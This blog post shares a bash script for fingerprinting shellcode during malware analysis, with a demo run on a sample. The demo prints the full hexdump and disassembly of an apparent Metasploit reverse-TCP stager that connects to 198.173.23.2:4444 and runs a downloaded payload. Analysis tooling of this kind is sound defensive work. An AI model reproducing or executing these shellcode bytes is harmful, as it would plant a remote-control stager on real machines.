---
layout: post
title:  "Disassemble Script"
description: "An old script that automated disassembly of shellcode to determine its functionality"
date:   2019-02-27 11:49:33 +0000
tags: [Malware, Incident Response, Pentesting, Red Team]
---
![](/assets/malware.png)

## Introduction 
Earlier this month John Lambert(@JohnLaTwc) shared this tweet:
https://twitter.com/JohnLaTwC/status/1097219687312646145

![John Lamebert Tweet 1097219687312646145](/assets/JohnL-shellcode.png)

The URL in the tweet is this:
 * [https://github.com/JohnLaTwC/Shared/blob/master/notebooks/Malware%20PowerShell%20shellcode%20analysis.ipynb
](https://github.com/JohnLaTwC/Shared/blob/master/notebooks/Malware%20PowerShell%20shellcode%20analysis.ipynb)

## Our disassemble script

Great minds think alike - so it seems. We noticed similarities with one of our internal scripts, that we use
to aid us in malware analysis. So in the interests of sharing, we have published our secret-sauce shellcode script.

This script is nothing new in our eyes, and cobbles together some familiar programs, that quickly spit out data.
We have been using for the last few years, to remove some of the common malware analysis tasks and on occasion 
has given us insight into the nature of the shellcode in as little as a minute. Our juniors run this script as the 
base response to any detected shellcode before diving deeper into debuggers - inorder to quickly infer and build 
hypothesis on the true nature to any suspicious code

Its quick and dirty, but helpful on analysing/fingerprinting specific shellcode, ours was used in an attempt
to fingerprint Metasploit shellcode.

Out script can be found here
 * [https://gist.github.com/netscylla/9c14da340706d553920edc18bc7c308a](https://gist.github.com/netscylla/9c14da340706d553920edc18bc7c308a)

```
#!/bin/bash
##########################################
#
# Disass.sh (c) 2014
#  Leveraging other OS disassembly and AV tools to fingerprint potential malware
#
# License : 
# http://www.gnu.org/licenses/agpl-3.0.txt
#
# Author: Andy @ Netscylla 
#
###########################################

echo -en "Testing for dependancies\n==============\n"
if [ ! -f "/usr/bin/md5" ]; then
    export MD5_PROG="openssl dgst -md5"
    echo -en "Using OpenSSL for MD5\n"
else
    export MD5_PROG="/usr/bin/md5"
    echo -en "Found md5\n"
fi

export SHA_PROG="openssl dgst -sha1"
echo -en "Using OpenSSL for SHA1\n"


if [ "$1" != "" ]; then

    echo -en "\nFile Info\n==============\n"
    echo "Filename: $1"
    echo "Date: `date`"
    md5=`$MD5_PROG $1`
    echo "$md5"
    sha=`$SHA_PROG $1`
    echo "$sha"
    magic=`file $1`
    echo "magic: $magic"

    if [ "$magic" == "$1: ASCII text, with very long lines" ]; then
        echo "FOUND ASCII FILE.... ANALYSING..."

        base64 -D -i $1 -o $1.data
        magic=`file $1.data`
        echo "magic: $magic"
        
    fi

    if [ ! -f $1.data ]; then
      echo "creating data file $1.data"
      cp $1 $1.data
      magic=`file $1.data`
      echo "magic: $magic"
    fi

    if [ "$magic" == "$1.data: data" ]; then

        if [ ! -f $1.data ]; then
          cp $1 $1.data
        fi

        echo -en "\n.text extracted\n==============\n"
        md5=`$MD5_PROG $1.data`
        echo "$md5"
        sha=`$SHA_PROG $1.data`
        echo "$sha"

	header=`xxd $1.data |head -n 1|cut -b 10-48`
	if [ "$header" == "fcbb 07f3 38b3 eb0c 5e56 311e ad01 c385" ]; then
		echo "FOUND JMP_ADDITIVE XOR"
	fi

        cat $1.data |xxd -pr|awk '{printf "%s", $0}'|xargs rasm2 -a x86 -D |sed -e 's/push 0xe553a458/push 0xe553a458 ; hash("kernel32.dll","VirtualAlloc")/g'| sed -e 's/push 0x5fc8d902/push 0x5fc8d902 ; hash("ws2_32.dll","recv")/g'|sed -e 's/push 0x300f2f0b /push 0x300f2f0b ; hash("kernel32.dll","VirtualFree")/g'| sed -e 's/push 0x56a2b5f0/push 0x56a2b5f0 ; hash("kernel32.dll","ExitProcess")/g'|sed -e 's/push 0x614d6e75/push 0x614d6e75 ; hash("ws2_32.dll","closesocket")/g'|sed -e 's/mov ebx, 0x56a2b5f0/mov ebx, 0x56a2b5f0 ; hash("kernel32.dll","ExitProcess")/g'|sed -e 's/push 0x6174a599/push 0x6174a599 ; hash("ws2_32.dll","connect")/g'|sed -e 's/push 0xe0df0fea/push 0xe0df0fea ; hash("ws2_32.dll","WSASocketA")/g'|sed -e 's/push 0x5f327377/push 0x5f327377 ; push 'ws2_32',0,0/g'|sed -e 's/push 0x726774c/push 0x726774c ; hash("kernel32.dll","LoadLibraryA")/g'|sed -e 's/push 0x300f2f0b/push 0x300f2f0b ; hash("kernel32.dll","VirtualFree")/g'|sed -e 's/push 0x6b8029/push 0x6b8029 ; hash("ws2_32.dll", "WSAStartupA")/g'|sed -e 's/mov ebx, 0x6f721347/mov ebx, 0x6f721347 ; hash("ntdll.dll","RtlExitUserThread")/g'|sed -e s'/push 0x9dbd95a6/push 0x9dbd95a6 ; hash("kernel32.dll","GetVersion")/g'|sed -e 's/push 0x863fcc79/push 0x863fcc79 ; hash("kernel32.dll","CreateProcessA")/g'|sed -e 's/push 0x601d8708/push 0x601d8708 ; hash("kernel32.dll","WaitForSingleObject")/g'|sed -e 's/push 0xe13bec74/push 0xe13bec74 ; hash("ws2_32.dll","accept")/g'|sed -e 's/push 0xff38e9b7/push 0xff38e9b7 ; hash("ws2_32.dll","listen")/g'|sed -e 's/push 0x6737dbc2/push 0x6737dbc2 ; hash("ws2_32.dll","bind")/g'|sed -e 's/add byte \[ebx + 0x56a2b5f0\], bh/add byte \[ebx + 0x56a2b5f0\], bh ; hash("kernel32.dll","ExitProcess")/g'|sed -e 's/push 0xe2899612/push 0xe2899612  ; hash("wininet.dll","InternetReadFile")/g'|sed -e 's/push 0x7b18062d/push 0x7b18062d ; hash("wininet.dll","HttpSendRequestA")/g'|sed -e 's/push 0x696e6977/push 0x696e6977 ; 'wininet',0/g'|sed -e 's/push 0xa779563a/push 0xa779563a ; hash("wininet.dll","InternetOpenA")/g'|sed -e 's/push 0x3b2e55eb/push 0x3b2e55eb ; hash("wininet.dll","HttpOpenRequestA")/g' |sed -e 's/push 0xe7bdd8c5/push 0xe7bdd8c5 ; hash("kernel32.dll","WriteProcessMemory”)/g' |sed -e 's/push 0xe035f044/push 0xe035f044 ; hash("kernel32.dll","Sleep”)/g'|sed -e 's/push 0x799aacc6/push 0x799aacc6 ; hash("kernel32.dll","CreateRemoteThread”)/g'|sed -e 's/push 0x3f9287ae/push 0x3f9287ae ; hash("kernel32.dll","VirtualAllocEx”)/g'|sed -e 's/push 0xb16b4ab1/push 0xb16b4ab1 ; hash("kernel32.dll","GetStartupInfoA”)/g'|sed -e 's/push 0x863fcc79/push 0x863fcc79 ; hash("kernel32.dll","CreateProcessA”)/g'|sed -e 's/push 0x869e4675/push 0x869e4675 ; hash("wininet.dll", "InternetSetOptionA”)/g' |sed -e 's/push 0x84e03200/push 0x84e03200 ; hash("wininet.dll", "HttpOpenRequestA”)/g' |sed -e 's/push 0x709d8805/push 0x709d8805 ; hash("winhttp.dll","WinHttpReceiveResponse")/g' |sed -e 's/push 0x91bb5895/push 0x91bb5895 ; hash("winhttp.dll","WinHttpSendRequest")/g'|sed -e 's/push 0xce9d58d3/push 0xce9d58d3 ; hash("winhttp.dll","WinHttpSetOption")/g' |sed -e 's/push 0xc69f8957/push 0xc69f8957 ; hash("wininet.dll","InternetConnectA")/g' |sed -e 's/push 0x61736e64/push 0x61736e64 ; hash("dnsapi.dll","DNSAPI")/g' |sed -e 's/push 0xc99cc96a/push 0xc99cc96a ; hash("dnsapi.dll","DnsQuery_A")/g' | sed -e 's/push 0x90020/push 0x90020 ; Shellcode of Death!/g' | sed -e 's/push 0xbb5f9ead/push 0xbb5f9ead ; hash("kernel32.dll","ReadFile")/g'| sed -e 's/push 0xc0000000/push 0xc0000000 ; hash("dwDesiredAccess","GENERIC_READ | GENERIC_WRITE")/g'> $1.asm

        cat $1.asm

	echo -en "\nPossible Sockets?\n==============\n"

        octets=($(cat $1.asm |grep -B 11 "; hash(\"ws2_32.dll\",\"WSASocketA\")"|head -n 1 |awk '$4 == "push" {print $3}'|sed 's/../0x& /g' | tr ' ' '\n' ))
        ip=`printf "%d.%d.%d.%d" ${octets[1]} ${octets[2]} ${octets[3]} ${octets[4]} | sed 's/\.$//'`
   
        port=($(cat $1.asm |grep -B 10 "; hash(\"ws2_32.dll\",\"WSASocketA\")"|head -n  1|awk '$4 == "push" {print $3}'|cut -b 5- |sed 's/../0x& /g' | tr ' ' '\n'))
        port2=`printf "%x" ${port[1]} ${port[2]}`
        port=`printf "%d\n" 0x${port2}`
 
        echo "Connection string: $ip:$port"
   
        #another possibility for ip & port

        octets=($(cat $1.asm |grep -B 6 "; hash(\"ws2_32.dll\",\"connect\")"|head -n 1 |awk '$4 == "push" {print $3}'|sed 's/../0x& /g' | tr ' ' '\n' ))
        ip=`printf "%d.%d.%d.%d" ${octets[1]} ${octets[2]} ${octets[3]} ${octets[4]} | sed 's/\.$//'`

        port=($(cat $1.asm |grep -B 5 "; hash(\"ws2_32.dll\",\"connect\")"|head -n  1|awk '$4 == "push" {print $3}'|cut -b 5- |sed 's/../0x& /g' | tr ' ' '\n'))
        port2=`printf "%x" ${port[1]} ${port[2]}`
        port=`printf "%d\n" 0x${port2}`
        
        echo "Connection string: $ip:$port"
        
        #pull connection string from #windows/meterpreter/reverse_ord_tcp
        conn=$(cat $1.asm |sed -n '/68.*push/p'|awk '{print $3 }' |awk '!(NR%2){print$0p}{p=$0}')
        port2=$(echo $conn|cut -b 7-10)
        port=`printf "%d\n" 0x${port2}`
        octets=($(echo $conn|cut -b 13-22| sed 's/../0x& /g' | tr ' ' '\n'))
        ip=`printf "%d.%d.%d.%d" ${octets[0]} ${octets[1]} ${octets[2]} ${octets[3]}`
        
	
        echo "Connection string: $ip:$port"

        echo -en "\nStrings\n==============\n"
        my_strings=`strings $1.data`
        echo "$my_strings"

        echo -en "\nClamav\n==============\n"
        my_avscan=`clamscan $1.data|head -n 2`
        echo "$my_avscan"

        echo -en "\nMSF/Sample Fingerprint\n=====================\n"
        cat $1.asm|grep ";"|cut -f 2 -d";" > $1.msff
        msfmd5=`$MD5_PROG $1.msff`
        echo "$msfmd5"
        msfsha=`$SHA_PROG $1.msff`
        echo "$msfsha"
        sqlite3 msf.db "select payload from payload where hash = '`echo $msfmd5|awk {'print $2}'`'"
        echo -en "\n"

        echo "Cleaning up temporary files..."
        #rm $1.b64 $1.data $1.asm

    fi
else
    echo "Missing data file parameter"
fi
```

## Operation

### Suspicious Code

```
0000000: fce8 8200 0000 6089 e531 c064 8b50 308b  ......`..1.d.P0.
0000010: 520c 8b52 148b 7228 0fb7 4a26 31ff ac3c  R..R..r(..J&1..<
0000020: 617c 022c 20c1 cf0d 01c7 e2f2 5257 8b52  a|., .......RW.R
0000030: 108b 4a3c 8b4c 1178 e348 01d1 518b 5920  ..J<.L.x.H..Q.Y 
0000040: 01d3 8b49 18e3 3a49 8b34 8b01 d631 ffac  ...I..:I.4...1..
0000050: c1cf 0d01 c738 e075 f603 7df8 3b7d 2475  .....8.u..}.;}$u
0000060: e458 8b58 2401 d366 8b0c 4b8b 581c 01d3  .X.X$..f..K.X...
0000070: 8b04 8b01 d089 4424 245b 5b61 595a 51ff  ......D$$[[aYZQ.
0000080: e05f 5f5a 8b12 eb8d 5d68 3332 0000 6877  .__Z....]h32..hw
0000090: 7332 5f54 684c 7726 0789 e8ff d0b8 9001  s2_ThLw&........
00000a0: 0000 29c4 5450 6829 806b 00ff d56a 0a68  ..).TPh).k...j.h
00000b0: c6ad 1702 6802 0011 5c89 e650 5050 5040  ....h...\..PPPP@
00000c0: 5040 5068 ea0f dfe0 ffd5 976a 1056 5768  P@Ph.......j.VWh
00000d0: 99a5 7461 ffd5 85c0 740a ff4e 0875 ece8  ..ta....t..N.u..
00000e0: 6700 0000 6a00 6a04 5657 6802 d9c8 5fff  g...j.j.VWh..._.
00000f0: d583 f800 7e36 8b36 6a40 6800 1000 0056  ....~6.6j@h....V
0000100: 6a00 6858 a453 e5ff d593 536a 0056 5357  j.hX.S....Sj.VSW
0000110: 6802 d9c8 5fff d583 f800 7d28 5868 0040  h..._.....}(Xh.@
0000120: 0000 6a00 5068 0b2f 0f30 ffd5 5768 756e  ..j.Ph./.0..Whun
0000130: 4d61 ffd5 5e5e ff0c 240f 8570 ffff ffe9  Ma..^^..$..p....
0000140: 9bff ffff 01c3 29c6 75c1 c3bb f0b5 a256  ......).u......V
0000150: 6a00 53ff d5                             j.S..
```

### Running our script (the demo)

```
$ ./disass.sh test.sh 
Testing for dependancies
==============
Using OpenSSL for MD5
Using OpenSSL for SHA1

File Info
==============
Filename: test.sh
Date: Thu 28 Feb 2019 17:08:39 GMT
MD5(test.sh)= e7119aade864986693c2efb40f9267e0
SHA1(test.sh)= d9e2bb1a1dfc32fa043697dececa4dc142018247
magic: test.sh: data
creating data file test.sh.data
magic: test.sh.data: data

.text extracted
==============
MD5(test.sh.data)= e7119aade864986693c2efb40f9267e0
SHA1(test.sh.data)= d9e2bb1a1dfc32fa043697dececa4dc142018247
0x00000000   1                       fc  cld
0x00000001   5               e882000000  call 0x88
0x00000006   1                       60  pushal
0x00000007   2                     89e5  mov ebp, esp
0x00000009   2                     31c0  xor eax, eax
0x0000000b   4                 648b5030  mov edx, dword fs:[eax + 0x30]
0x0000000f   3                   8b520c  mov edx, dword [edx + 0xc]
0x00000012   3                   8b5214  mov edx, dword [edx + 0x14]
0x00000015   3                   8b7228  mov esi, dword [edx + 0x28]
0x00000018   4                 0fb74a26  movzx ecx, word [edx + 0x26]
0x0000001c   2                     31ff  xor edi, edi
0x0000001e   1                       ac  lodsb al, byte [esi]
0x0000001f   2                     3c61  cmp al, 0x61
0x00000021   2                     7c02  jl 0x25
0x00000023   2                     2c20  sub al, 0x20
0x00000025   3                   c1cf0d  ror edi, 0xd
0x00000028   2                     01c7  add edi, eax
0x0000002a   2                     e2f2  loop 0x1e
0x0000002c   1                       52  push edx
0x0000002d   1                       57  push edi
0x0000002e   3                   8b5210  mov edx, dword [edx + 0x10]
0x00000031   3                   8b4a3c  mov ecx, dword [edx + 0x3c]
0x00000034   4                 8b4c1178  mov ecx, dword [ecx + edx + 0x78]
0x00000038   2                     e348  jecxz 0x82
0x0000003a   2                     01d1  add ecx, edx
0x0000003c   1                       51  push ecx
0x0000003d   3                   8b5920  mov ebx, dword [ecx + 0x20]
0x00000040   2                     01d3  add ebx, edx
0x00000042   3                   8b4918  mov ecx, dword [ecx + 0x18]
0x00000045   2                     e33a  jecxz 0x81
0x00000047   1                       49  dec ecx
0x00000048   3                   8b348b  mov esi, dword [ebx + ecx*4]
0x0000004b   2                     01d6  add esi, edx
0x0000004d   2                     31ff  xor edi, edi
0x0000004f   1                       ac  lodsb al, byte [esi]
0x00000050   3                   c1cf0d  ror edi, 0xd
0x00000053   2                     01c7  add edi, eax
0x00000055   2                     38e0  cmp al, ah
0x00000057   2                     75f6  jne 0x4f
0x00000059   3                   037df8  add edi, dword [ebp - 8]
0x0000005c   3                   3b7d24  cmp edi, dword [ebp + 0x24]
0x0000005f   2                     75e4  jne 0x45
0x00000061   1                       58  pop eax
0x00000062   3                   8b5824  mov ebx, dword [eax + 0x24]
0x00000065   2                     01d3  add ebx, edx
0x00000067   4                 668b0c4b  mov cx, word [ebx + ecx*2]
0x0000006b   3                   8b581c  mov ebx, dword [eax + 0x1c]
0x0000006e   2                     01d3  add ebx, edx
0x00000070   3                   8b048b  mov eax, dword [ebx + ecx*4]
0x00000073   2                     01d0  add eax, edx
0x00000075   4                 89442424  mov dword [esp + 0x24], eax
0x00000079   1                       5b  pop ebx
0x0000007a   1                       5b  pop ebx
0x0000007b   1                       61  popal
0x0000007c   1                       59  pop ecx
0x0000007d   1                       5a  pop edx
0x0000007e   1                       51  push ecx
0x0000007f   2                     ffe0  jmp eax
0x00000081   1                       5f  pop edi
0x00000082   1                       5f  pop edi
0x00000083   1                       5a  pop edx
0x00000084   2                     8b12  mov edx, dword [edx]
0x00000086   2                     eb8d  jmp 0x15
0x00000088   1                       5d  pop ebp
0x00000089   5               6833320000  push 0x3233
0x0000008e   5               687773325f  push 0x5f327377 ; push ws2_32,0,0
0x00000093   1                       54  push esp
0x00000094   5               684c772607  push 0x726774c ; hash("kernel32.dll","LoadLibraryA")
0x00000099   2                     89e8  mov eax, ebp
0x0000009b   2                     ffd0  call eax
0x0000009d   5               b890010000  mov eax, 0x190
0x000000a2   2                     29c4  sub esp, eax
0x000000a4   1                       54  push esp
0x000000a5   1                       50  push eax
0x000000a6   5               6829806b00  push 0x6b8029 ; hash("ws2_32.dll", "WSAStartupA")
0x000000ab   2                     ffd5  call ebp
0x000000ad   2                     6a0a  push 0xa
0x000000af   5               68c6ad1702  push 0x217adc6
0x000000b4   5               680200115c  push 0x5c110002
0x000000b9   2                     89e6  mov esi, esp
0x000000bb   1                       50  push eax
0x000000bc   1                       50  push eax
0x000000bd   1                       50  push eax
0x000000be   1                       50  push eax
0x000000bf   1                       40  inc eax
0x000000c0   1                       50  push eax
0x000000c1   1                       40  inc eax
0x000000c2   1                       50  push eax
0x000000c3   5               68ea0fdfe0  push 0xe0df0fea ; hash("ws2_32.dll","WSASocketA")
0x000000c8   2                     ffd5  call ebp
0x000000ca   1                       97  xchg eax, edi
0x000000cb   2                     6a10  push 0x10
0x000000cd   1                       56  push esi
0x000000ce   1                       57  push edi
0x000000cf   5               6899a57461  push 0x6174a599 ; hash("ws2_32.dll","connect")
0x000000d4   2                     ffd5  call ebp
0x000000d6   2                     85c0  test eax, eax
0x000000d8   2                     740a  je 0xe4
0x000000da   3                   ff4e08  dec dword [esi + 8]
0x000000dd   2                     75ec  jne 0xcb
0x000000df   5               e867000000  call 0x14b
0x000000e4   2                     6a00  push 0
0x000000e6   2                     6a04  push 4
0x000000e8   1                       56  push esi
0x000000e9   1                       57  push edi
0x000000ea   5               6802d9c85f  push 0x5fc8d902 ; hash("ws2_32.dll","recv")
0x000000ef   2                     ffd5  call ebp
0x000000f1   3                   83f800  cmp eax, 0
0x000000f4   2                     7e36  jle 0x12c
0x000000f6   2                     8b36  mov esi, dword [esi]
0x000000f8   2                     6a40  push 0x40
0x000000fa   5               6800100000  push 0x1000
0x000000ff   1                       56  push esi
0x00000100   2                     6a00  push 0
0x00000102   5               6858a453e5  push 0xe553a458 ; hash("kernel32.dll","VirtualAlloc")
0x00000107   2                     ffd5  call ebp
0x00000109   1                       93  xchg eax, ebx
0x0000010a   1                       53  push ebx
0x0000010b   2                     6a00  push 0
0x0000010d   1                       56  push esi
0x0000010e   1                       53  push ebx
0x0000010f   1                       57  push edi
0x00000110   5               6802d9c85f  push 0x5fc8d902 ; hash("ws2_32.dll","recv")
0x00000115   2                     ffd5  call ebp
0x00000117   3                   83f800  cmp eax, 0
0x0000011a   2                     7d28  jge 0x144
0x0000011c   1                       58  pop eax
0x0000011d   5               6800400000  push 0x4000
0x00000122   2                     6a00  push 0
0x00000124   1                       50  push eax
0x00000125   5               680b2f0f30  push 0x300f2f0b ; hash("kernel32.dll","VirtualFree")
0x0000012a   2                     ffd5  call ebp
0x0000012c   1                       57  push edi
0x0000012d   5               68756e4d61  push 0x614d6e75 ; hash("ws2_32.dll","closesocket")
0x00000132   2                     ffd5  call ebp
0x00000134   1                       5e  pop esi
0x00000135   1                       5e  pop esi
0x00000136   3                   ff0c24  dec dword [esp]
0x00000139   6             0f8570ffffff  jne 0xaf
0x0000013f   5               e99bffffff  jmp 0xdf
0x00000144   2                     01c3  add ebx, eax
0x00000146   2                     29c6  sub esi, eax
0x00000148   2                     75c1  jne 0x10b
0x0000014a   1                       c3  ret
0x0000014b   5               bbf0b5a256  mov ebx, 0x56a2b5f0 ; hash("kernel32.dll","ExitProcess")
0x00000150   2                     6a00  push 0
0x00000152   1                       53  push ebx
0x00000153   2                     ffd5  call ebp

Possible Sockets?
==============
Connection string: 198.173.23.2:4444
Connection string: 234.15.223.224:0
Connection string: 51.50.0.0:12895

Strings
==============
;}$u
D$$[[aYZQ
]h32
hws2_ThLw&
TPh)
PPPP@P@Ph
6j@h
VSWh
}(Xh
WhunMa

Clamav
==============
test.sh.data: Win.Trojan.MSShellcode-7 FOUND

MSF/Sample Fingerprint
=====================
MD5(test.sh.msff)= 92f42265acf057eab58a7ae8b35ededa
SHA1(test.sh.msff)= fdbccfbd1fd4af350c2f12b15f3c814062c86189
Error: no such table: payload

Cleaning up temporary files...
```